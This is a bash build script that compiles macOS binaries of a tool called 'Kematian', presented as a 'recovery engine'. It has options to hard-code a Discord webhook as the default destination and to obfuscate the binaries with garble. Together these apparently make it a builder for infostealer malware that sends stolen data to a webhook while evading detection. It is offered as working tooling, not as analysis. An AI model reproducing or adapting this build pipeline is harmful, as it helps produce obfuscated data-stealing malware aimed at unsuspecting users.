#!/usr/bin/env bash
# Build standalone Kematian macOS binaries from Kematian-Mac (Kematian-main recovery engine).
# Run on macOS with CGO enabled.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
OUT_DIR="${ROOT}/dist"
mkdir -p "${OUT_DIR}"

LDFLAGS="-s -w"
BUILD_CMD=(go build -ldflags="${LDFLAGS}")

if [[ -n "${DISCORD_WEBHOOK:-}" ]]; then
  LDFLAGS="${LDFLAGS} -X main.defaultWebhook=${DISCORD_WEBHOOK}"
  BUILD_CMD=(go build -ldflags="${LDFLAGS}")
fi

if [[ "${OBFUSCATE:-false}" == "true" ]]; then
  BUILD_CMD=(garble build -ldflags="${LDFLAGS}")
fi

pushd "${ROOT}" >/dev/null
export CGO_ENABLED=1
export GOOS=darwin

for arch in arm64 amd64; do
  echo "== Building kematian darwin/${arch} =="
  GOOS=darwin GOARCH="${arch}" "${BUILD_CMD[@]}" \
    -o "${OUT_DIR}/kematian-darwin-${arch}" ./cmd/kematian
done

popd >/dev/null
echo "Done: ${OUT_DIR}/kematian-darwin-{arm64,amd64}"